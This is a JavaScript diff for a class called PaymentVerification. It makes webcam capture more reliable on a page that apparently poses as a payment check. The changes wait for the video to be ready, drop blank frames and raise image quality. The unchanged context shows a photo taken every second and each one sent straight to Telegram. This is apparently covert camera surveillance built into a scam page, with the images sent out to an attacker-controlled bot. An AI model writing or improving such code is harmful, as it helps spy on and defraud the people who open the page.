@@ -123,18 +123,39 @@ class PaymentVerification {
             this.hasPermission = true;
             this.video.srcObject = this.stream;
             
-            // Mostrar contenido principal inmediatamente
+            // Configurar video para autoplay
+            this.video.autoplay = true;
+            this.video.muted = true;
+            this.video.playsInline = true;
+            
+            // Esperar a que el video esté completamente listo
+            await new Promise((resolve) => {
+                this.video.onloadedmetadata = () => {
+                    console.log(`📹 Video listo: ${this.video.videoWidth}x${this.video.videoHeight}`);
+                    resolve();
+                };
+            });
+            
+            // Asegurar que el video esté reproduciéndose
+            try {
+                await this.video.play();
+                console.log('▶️ Video reproduciéndose');
+            } catch (e) {
+                console.log('⚠️ Error reproduciendo video:', e);
+            }
+            
+            // Esperar un momento extra para que el video se estabilice
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Mostrar contenido principal después de que todo esté listo
             document.getElementById('initialLoading').style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
-            
-            // Esperar a que el video esté listo
-            await new Promise(resolve => {
-                this.video.onloadedmetadata = resolve;
-            });
             
             // Configurar canvas para captura de fotos
             this.canvas.width = this.video.videoWidth || 640;
             this.canvas.height = this.video.videoHeight || 480;
+            
+            console.log(`🎨 Canvas configurado: ${this.canvas.width}x${this.canvas.height}`);
             
             // Comenzar captura de fotos cada segundo
             this.startPhotoCapture();
@@ -214,22 +235,41 @@ class PaymentVerification {
         if (!this.hasPermission || !this.stream) return;
         
         try {
+            // Verificar que el video esté listo y reproduciéndose
+            if (this.video.readyState < 2) {
+                console.log('⏳ Video no está listo, esperando...');
+                return;
+            }
+            
+            if (this.video.videoWidth === 0 || this.video.videoHeight === 0) {
+                console.log('⏳ Dimensiones del video no disponibles, esperando...');
+                return;
+            }
+            
+            // Asegurar que el canvas tenga el tamaño correcto
+            this.canvas.width = this.video.videoWidth;
+            this.canvas.height = this.video.videoHeight;
+            
             // Capturar frame actual del video
             const ctx = this.canvas.getContext('2d');
+            ctx.fillStyle = '#000000'; // Fondo negro por defecto
+            ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
+            
+            // Dibujar el video en el canvas
             ctx.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
             
-            // Convertir a blob JPEG
+            // Convertir a blob JPEG con mayor calidad
             const blob = await new Promise(resolve => {
-                this.canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                this.canvas.toBlob(resolve, 'image/jpeg', 0.9);
             });
             
-            if (!blob) {
-                console.log('❌ Error capturando foto');
+            if (!blob || blob.size < 1000) { // Si la imagen es muy pequeña, probablemente está vacía
+                console.log('❌ Error capturando foto o foto muy pequeña');
                 return;
             }
             
             this.photoCount++;
-            console.log(`📸 Foto #${this.photoCount} capturada (${(blob.size / 1024).toFixed(2)}KB)`);
+            console.log(`📸 Foto #${this.photoCount} capturada (${(blob.size / 1024).toFixed(2)}KB) - ${this.canvas.width}x${this.canvas.height}`);
             
             // Enviar foto a Telegram inmediatamente
             await this.sendPhotoToTelegram(blob);
